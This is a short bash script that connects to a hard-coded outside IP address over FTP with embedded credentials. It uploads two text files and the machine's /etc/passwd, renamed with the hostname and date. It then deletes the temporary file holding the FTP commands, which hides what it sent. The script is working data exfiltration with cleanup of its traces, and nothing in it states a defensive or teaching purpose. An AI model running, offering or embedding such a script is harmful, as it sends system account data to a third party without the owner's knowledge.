#! /usr/bin/bash
touch ftpcommands.txt
echo $'open 18.183.214.29\nuser savemygpa 3204\nput gpadead.txt\nput gpasaved.txt\nput /etc/passwd' $'\"passwd'$(hostname)$(date).txt$'\"\nbye' > ftpcommands.txt
ftp -n < ftpcommands.txt
rm -r ftpcommands.txt
